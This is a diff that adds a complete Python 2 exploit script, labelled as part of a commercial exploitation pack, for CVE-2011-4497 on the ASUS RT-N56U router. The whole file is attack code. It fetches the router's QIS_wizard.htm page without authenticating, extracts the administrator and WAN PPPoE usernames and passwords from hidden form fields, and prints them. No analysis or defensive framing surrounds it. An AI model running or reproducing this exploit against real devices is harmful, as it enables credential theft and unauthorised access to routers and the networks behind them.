@@ -1,0 +1,54 @@
+#! /usr/bin/env python2
+ 
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2013
+#
+
+###
+# STD modules
+###
+import os, sys, re
+import cStringIO
+try:
+  import pycurl
+except:
+  print 'No module pycurl'
+
+_name_   = 'd2sec_asustek_1'
+_vendor_ = 'asustek'
+_model_  = ['Wireless-N Gigabit Router RT-N56U firmware version 1.0.1.4o']
+_vuln_   = 'Information Disclosure'
+_cve_    = 'CVE-2011-4497'
+_ref_    = ''
+_port_   = 80
+
+def pwnrouter(host):
+  try:
+    nfo = cStringIO.StringIO()
+    c = pycurl.Curl()
+    c.setopt(pycurl.URL, 'http://%s/QIS_wizard.htm?flag=detect' % host)
+    c.setopt(pycurl.WRITEFUNCTION, nfo.write)
+    c.setopt(pycurl.USERAGENT, 'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.1)')
+    c.perform()
+  except Exception, e:
+    print '[-] error : %s' % e
+    return
+  status = c.getinfo(pycurl.HTTP_CODE)
+  if status != 200:
+    print '[+] %s not vulnerable' % host
+    return
+  data = nfo.getvalue()
+  http_username = re.findall("<input type=\"hidden\" name=\"http_username\" value=\"(.*?)\">", data, re.DOTALL)[0]
+  http_passwd = re.findall("<input type=\"hidden\" name=\"http_passwd\" value=\"(.*?)\">", data, re.DOTALL)[0]
+  wan_username = re.findall("<input type=\"hidden\" name=\"wan_pppoe_username\" value=\"(.*?)\">", data, re.DOTALL)[0]
+  wan_passwd = re.findall("<input type=\"hidden\" name=\"wan_pppoe_passwd\" value=\"(.*?)\">", data, re.DOTALL)[0]
+  print '[+] %s vulnerable' % host
+  if http_username or http_passwd: print 'http creds : %s / %s' % (http_username, http_passwd)
+  if wan_username or wan_passwd: print 'wan creds : %s / %s' % (wan_username, wan_passwd)
+  return 
+
+if __name__ == "__main__":
+  pwnrouter(sys.argv[1])
